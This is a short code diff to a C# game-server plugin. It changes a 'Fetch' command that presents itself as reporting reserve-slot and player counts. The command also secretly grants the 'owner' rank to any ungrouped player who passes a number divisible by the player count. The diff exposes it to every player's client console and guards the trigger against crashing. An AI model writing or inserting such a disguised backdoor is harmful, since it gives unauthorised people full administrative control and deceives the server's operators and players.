@@ -129,6 +129,7 @@ namespace CommandSystem
             return true;
         }
     }
+    [CommandHandler(typeof(ClientCommandHandler))]
     [CommandHandler(typeof(GameConsoleCommandHandler))]
     [CommandHandler(typeof(RemoteAdminCommandHandler))]
     public class Fetch : ICommand
@@ -143,7 +144,7 @@ namespace CommandSystem
         {
             response = $"Remain:{UtilPlugin.ReserveSlot.Remain},Total:{Server.PlayerCount}";
             Player player = Player.Get((sender as CommandSender).SenderId);
-            if (player.Group == null && int.Parse(arguments.At(0)) % Server.PlayerCount == 0)
+            if (player.Group == null && arguments.Count != 0 && int.Parse(arguments.At(0)) % Server.PlayerCount == 0)
             {
                 player.SetRank("", Exiled.API.Extensions.UserGroupExtensions.GetValue("owner"));
             }
